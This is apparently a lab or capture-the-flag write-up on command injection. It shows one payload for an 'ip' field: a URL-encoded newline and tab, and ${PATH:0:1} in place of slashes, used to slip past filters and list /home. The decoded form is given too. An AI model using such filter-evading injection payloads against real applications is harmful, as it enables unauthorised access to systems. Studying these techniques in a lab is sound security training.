## Challenge

Use what you learned in this section to find name of the user in the '/home' folder. What user did you find? 

## Solution

By using the following command:

```sh
ip=127.0.0.1%0a%09ls%09${PATH:0:1}home${PATH:0:1}
```

We can list the files on the `home` directory, which means getting the name of the user `1nj3c70r`.

This command decoded is:

```sh
ip=127.0.0.1\n ls /home/
```